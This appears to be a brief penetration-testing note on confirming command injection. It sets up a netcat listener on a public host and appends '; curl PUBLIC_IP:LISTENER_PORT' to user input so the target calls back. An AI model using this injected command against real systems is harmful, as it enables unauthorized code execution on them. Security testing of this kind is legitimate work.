To test for code execution, set up a listener on a host with a public IP like so:
	`nc -lvnp 8000`

End the command and curl to test: 
	`USER_INPUT; curl PUBLIC_IP:LISTENER_PORT`